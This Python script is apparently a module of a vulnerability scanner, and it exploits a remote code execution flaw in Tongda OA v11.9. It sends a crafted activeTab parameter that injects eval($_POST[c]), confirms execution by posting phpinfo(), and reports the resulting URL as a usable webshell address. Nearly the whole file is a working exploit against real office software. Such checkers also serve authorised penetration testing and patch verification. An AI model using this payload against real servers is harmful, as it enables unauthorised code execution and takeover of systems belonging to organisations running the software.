import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v11_9_getdata_任意命令执行(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=urldata+'general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[c]))%3B/*&id=19&module=Carouselimage'
    try:
        renpose = requests.get(url=exp_url,headers=headers).text
        if 'activeTab' in renpose:
            datamima = {"c":"phpinfo();"}
            exprepose = requests.post(exp_url,headers=headers,data=datamima)
            if "Version" in exprepose.text:
                print(Vcolors.RED + "[+] 存在通达OA_v11_9_getdata_任意命令执行" + Vcolors.ENDC)
                print(Vcolors.RED + "[+] 连接webshell地址为{}".format(exp_url) + Vcolors.ENDC)
            else:
                print(Vcolors.WARNING + "[x] 不存在通达OA_v11_9_getdata_任意命令执行" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在通达OA_v11_9_getdata_任意命令执行" + Vcolors.ENDC)
    # except KeyError as e:
    #     pass
    except:
        logging.error("通达OA_v11_9_getdata_任意命令执行脚本出现异常")



